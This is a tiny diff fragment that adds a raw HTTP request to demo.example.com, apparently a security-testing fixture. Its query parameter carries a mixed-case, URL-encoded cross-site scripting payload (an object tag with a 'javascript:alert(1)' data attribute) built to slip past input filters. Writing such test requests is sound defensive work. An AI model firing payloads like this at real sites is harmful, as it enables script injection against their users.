@@ -1,0 +1,4 @@
+GET /a?path=<oBjEcT%20dAtA%3D"jAvAsCrIpT:aLeRt(1)"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
